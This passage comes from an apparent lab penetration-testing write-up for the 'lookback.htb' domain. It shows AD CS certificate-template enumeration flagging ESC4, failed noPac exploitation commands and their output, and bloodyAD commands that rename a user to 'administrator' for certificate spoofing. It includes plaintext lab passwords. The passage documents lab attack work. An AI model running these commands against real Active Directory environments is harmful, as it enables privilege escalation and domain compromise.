      ESC4                              : Template is owned by user.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
  20
    Template Name                       : DomainController
    Display Name                        : Domain Controller
    Certificate Authorities             : lookback-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Enterprise Read-only Domain Controllers
                                          LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Admins
                                          LOOKBACK.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Controllers
                                          LOOKBACK.HTB\Enterprise Admins
                                          LOOKBACK.HTB\Enterprise Domain Controllers
    [+] User Enrollable Principals      : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  21
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : lookback-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Computers
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Computers
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User Enrollable Principals      : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Computers
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  22
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  23
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  24
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  25
    Template Name                       : CTLSigning
    Display Name                        : Trust List Signing
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Microsoft Trust List Signing
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  26
    Template Name                       : CodeSigning
    Display Name                        : Code Signing
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Code Signing
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  27
    Template Name                       : EFSRecovery
    Display Name                        : EFS Recovery Agent
    Certificate Authorities             : lookback-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : File Recovery
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User Enrollable Principals      : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  28
    Template Name                       : Administrator
    Display Name                        : Administrator
    Certificate Authorities             : lookback-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Microsoft Trust List Signing
                                          Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User Enrollable Principals      : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  29
    Template Name                       : EFS
    Display Name                        : Basic EFS
    Certificate Authorities             : lookback-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Users
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Users
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User Enrollable Principals      : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Users
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  30
    Template Name                       : SmartcardLogon
    Display Name                        : Smartcard Logon
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Extended Key Usage                  : Client Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  31
    Template Name                       : ClientAuth
    Display Name                        : Authenticated Session
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Users
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Users
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  32
    Template Name                       : SmartcardUser
    Display Name                        : Smartcard User
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Extended Key Usage                  : Secure Email
                                          Client Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  33
    Template Name                       : UserSignature
    Display Name                        : User Signature Only
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Users
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Users
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
  34
    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : lookback-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-10-19T13:52:34+00:00
    Template Last Modified              : 2025-10-19T13:52:34+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Users
                                          LOOKBACK.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : LOOKBACK.HTB\Enterprise Admins
        Full Control Principals         : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Owner Principals          : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Dacl Principals           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Enterprise Admins
        Write Property Enroll           : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Users
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User Enrollable Principals      : LOOKBACK.HTB\Domain Admins
                                          LOOKBACK.HTB\Domain Users
                                          LOOKBACK.HTB\Enterprise Admins
    [+] User ACL Principals             : LOOKBACK.HTB\Enterprise Admins
    [!] Vulnerabilities
      ESC4                              : Template is owned by user.
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.

```

# Bad Ending-NoPac&证书欺诈
## NoPac（CVE-2021-42278/42287）
> 该环境具备域控和 MAQ，理论上可能触发 noPac
>

### Test
> `ms-DS-MachineAccountQuota` 为 **10**，说明域环境允许普通用户创建机器账户
>

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q bloodyAD -u 'IT-login-user' -p 'ITLogin!2026#Qw' -d lookback.htb --host 172.16.55.128 get object 'DC=lookback,DC=htb' --attr ms-DS-MachineAccountQuota

distinguishedName: DC=lookback,DC=htb
ms-DS-MachineAccountQuota: 10
```

### Command
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q nxc smb 172.16.55.128 -d lookback.htb -u IT-login-user -p 'ITLogin!2026#Qw' -M nopac
SMB         172.16.55.128   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:lookback.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.55.128   445    DC01             [+] lookback.htb\IT-login-user:ITLogin!2026#Qw 
NOPAC       172.16.55.128   445    DC01             TGT with PAC size 1641
NOPAC       172.16.55.128   445    DC01             TGT without PAC size 1641
```

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q python3 /home/kali/Desktop/tools/noPac/scanner.py lookback.htb/IT-login-user:'ITLogin!2026#Qw' -dc-ip 172.16.55.128


███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
                                           
                                        
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.55.128. Ticket size 1641
[*] Got TGT from 172.16.55.128. Ticket size 1641
```

```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q python3 /home/kali/Desktop/tools/noPac/noPac.py lookback.htb/IT-login-user:'ITLogin!2026#Qw' -dc-ip 172.16.55.128 -use-ldap -dump

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target dc01.lookback.htb
[*] Total Domain Admins 1
[*] will try to impersonate Administrator
[*] Adding Computer Account "WIN-I7X138TGYVJ$"
[*] MachineAccount "WIN-I7X138TGYVJ$" password = (xjuA$rVynCp
[*] Successfully added machine account WIN-I7X138TGYVJ$ with password (xjuA$rVynCp.
[*] WIN-I7X138TGYVJ$ object = CN=WIN-I7X138TGYVJ,CN=Computers,DC=lookback,DC=htb
[-] Cannot rename the machine account , Reason 00000523: SysErr: DSID-031A1256, problem 22 (Invalid argument), data 0

[*] Attempting to del a computer with the name: WIN-I7X138TGYVJ$
[-] Delete computer WIN-I7X138TGYVJ$ Failed! Maybe the current user does not have permission.
```

### Ending
+ 能拿 TGT、能创建机器账号
+ 重命名机器账号时报 `problem 22 (Invalid argument)`

## 证书欺诈
###  `IT-login-user` 更名 `administrator`（无空格-失败）
```plain
proxychains -q bloodyAD --host 172.16.55.128 -d lookback.htb -u 'IT-admin' -p 'V9#bT6itAdmin2026!' set object IT-login-user sAMAccountName -v 'administrator'
```

### `IT-login-user` 更名 `administrator `（有空格-成功）
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q bloodyAD --host 172.16.55.128 -d lookback.htb -u 'IT-admin' -p 'V9bT6itAdmin2026' set object 'administrator ' userPrincipalName -v 'administrator@lookback.htb'
[+] IT-login-user's sAMAccountName has been updated
```

### 为 `administrator ` 设置 UPN 为 `administrator@lookback.htb`
```plain
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q bloodyAD --host 172.16.55.128 -d lookback.htb -u 'IT-admin' -p 'V9bT6itAdmin2026' set object 'administrator ' userPrincipalName -v 'administrator@lookback.htb'
[+] administrator 's userPrincipalName has been updated
```

### 核对修改后的属性（sAMAccountName、UPN、SID）
```plain
┌──(web)─(root㉿kali)-[/home/kali]
